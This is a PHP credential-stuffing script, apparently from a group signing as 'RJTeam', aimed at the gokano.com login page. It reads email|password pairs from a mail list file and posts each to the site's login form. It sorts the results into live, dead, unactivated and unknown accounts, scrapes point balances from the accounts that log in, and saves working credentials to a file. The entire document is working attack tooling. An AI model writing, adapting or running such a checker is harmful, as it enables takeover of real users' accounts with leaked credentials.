<?php

include"class_curl.php";
error_reporting(0);

$regards = "

__________      ____.___________                    
\______   \    |    |\__    ___/___ _____    _____  ™
 |       _/    |    |  |    |_/ __ \\__  \  /     \ 
 |    |   \/\__|    |  |    |\  ___/ / __ \|  Y Y  \
 |____|_  /\________|  |____| \___  >____  /__|_|  /
        \/                        \/     \/      \/ 

";


















        $curl = new curl();
        $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
        $curl->ssl(0, 2);

	    function Savedata($file,$data){
	        $file = fopen($file,"a");       
	        fputs($file,PHP_EOL.$data);  
	        return fclose($file);
	    }

	    /*	Mailist file here  */

	    $file = "1kid.txt";

	    /*	Save file to?  */

	    $savelive = "Save/save-gokano.txt";	//	Save live result

	    $r = md5(rand(1,9));
	    $saven = "Save/UNK-".$r.".txt";		// Save unknow result

	    $url = "https://gokano.com/login";

	    /*	End   */

	    $files = file_get_contents($file);
	    $ext = explode("\r\n",$files);
	    $count = count($ext);

	    	$live = 0;
	    	$die = 0;
	    	$unk = 0;
	    	$activ = 0;

	    foreach($ext as $num => $val){
	    	$numb = $num+1;
	    	$var = explode("|",$val);
	    	$email = $var[0];
	    	$pass = $var[1];

	    	

	    	$data = "email=$email&password=$pass";
	        $post = $curl->post($url,$data);
	        
	        if(preg_match('/logout/', $post)){
	        	$live = $live+1;

	        	// Get point : 
	        	$x = explode('<div>',$post);
	        	$z = explode('</div>',$x[1]);
	        	$gn = $z[0];

	        	$p = explode('</div>',$x[2]);
	        	$gp = $p[0];

	        	$datasave = "$email|$pass | $gn | $gp";
	        	$save = Savedata($savelive,$datasave);
	        	echo"[$live/$count] Live -> $datasave\n";
	        	$curl->get("https://gokano.com/logout");
	        	
	        }elseif(preg_match('/Incorrect email and password/', $post)){
	        	$die = $die+1;
	        	echo"[$die/$count] Die -> $email|$pass\n";
	        }elseif(preg_match('/Activate account first/', $post)){
	        	$activ = $activ+1;
	        	echo"[$activ/$count] NOT Activate -> $email | $pass\n";
	        }else{
	        	$unk = $unk+1;
	        	$saveunk = "$email|$pass";
	        	
	        	
	        	$savingunk = Savedata($saven,$saveunk);
	        	echo"[$unk/$count] UNK -> $saveunk\n";
	        }
	    }

        
        